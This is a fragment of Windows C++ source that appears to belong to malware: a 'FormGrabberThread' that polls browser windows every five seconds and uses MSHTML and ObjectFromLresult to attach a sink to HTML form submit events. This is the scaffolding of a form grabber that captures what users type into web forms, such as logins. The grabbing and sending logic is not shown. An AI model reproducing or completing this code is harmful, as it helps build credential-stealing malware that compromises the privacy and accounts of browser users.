#include <windows.h>
#include <atlbase.h>
#include <objbase.h>
#include <mshtml.h>
#include <mshtmdid.h>
#include <oleacc.h>
#include <vector>
#include <algorithm>
#include "thread.h"
#include "debug.h"
#include "config.h"

typedef HRESULT (__stdcall *LPOBJECTFROMLRESULT)(LRESULT, REFIID, WPARAM, VOID **);

template <class T>
class CWinSink : public IDispatch
{
public:
	CWinSink() : m_dwRef(1), m_hrConnected(CONNECT_E_CANNOTCONNECT), m_dwCookie(0), m_pCP(NULL) { }

	~CWinSink() { }

	HRESULT Init(T* pWin, IID rid);
	HRESULT Passivate()
	{
		HRESULT hr = NOERROR;
		if (m_pCP){
			if (m_dwCookie){
				hr = m_pCP->Unadvise(m_dwCookie);
				m_dwCookie = 0;
			}
			 m_pCP->Release();
			 m_pCP = NULL;
		}
		if (m_pWin){
			m_pWin->Release();
			m_pWin = NULL;
		}
		return NOERROR;
	}

	// IUnknown methods
    STDMETHOD(QueryInterface)(REFIID riid, LPVOID* ppv);
    STDMETHOD_(ULONG, AddRef)();
    STDMETHOD_(ULONG, Release)(); 

	// IDispatch method
	STDMETHOD(GetTypeInfoCount)(UINT* pctinfo) { return E_NOTIMPL; }
	STDMETHOD(GetTypeInfo)(UINT iTInfo, LCID lcid, ITypeInfo** ppTInfo) { return E_NOTIMPL; };
	STDMETHOD(GetIDsOfNames)(REFIID riid, LPOLESTR* rgszNames, UINT cNames, LCID lcid, DISPID* rgDispId) { return E_NOTIMPL; }
	STDMETHOD(Invoke)(DISPID dispIdMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS __RPC_FAR *pDispParams, VARIANT __RPC_FAR *pVarResult, EXCEPINFO __RPC_FAR *pExcepInfo, UINT __RPC_FAR *puArgErr);

protected:
	CComQIPtr<T> m_pWin;
	DWORD m_dwRef;

	LPCONNECTIONPOINT m_pCP;
	HRESULT m_hrConnected;
	DWORD m_dwCookie;

};

static LPOBJECTFROMLRESULT pfObjectFromLresult;
static UINT MsgGETOBJECT;
static HMODULE OLEACCdll;
static CWinSink<IHTMLFormElement> *OnSubmitEvent = new CWinSink<IHTMLFormElement>;

static BOOL CALLBACK EnumChildLog(HWND hWnd, LPARAM lParam);

class FormGrabberThread : public Thread
{
class EnumThread : public Thread
{
public:
	EnumThread(FormGrabberThread *P){
		EnumThread::P = P;
		StartThread();
	};
private:
	VOID ThreadFunc(VOID){
		while(1){
			PostThreadMessage(P->GetThreadID(), WM_APP, NULL, NULL);
			Sleep(5000);
		}
	};
	FormGrabberThread *P;
};
public:
	FormGrabberThread() { StartThread(); };

private:
	VOID ThreadFunc(VOID);

	static BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam);
	static BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam);
};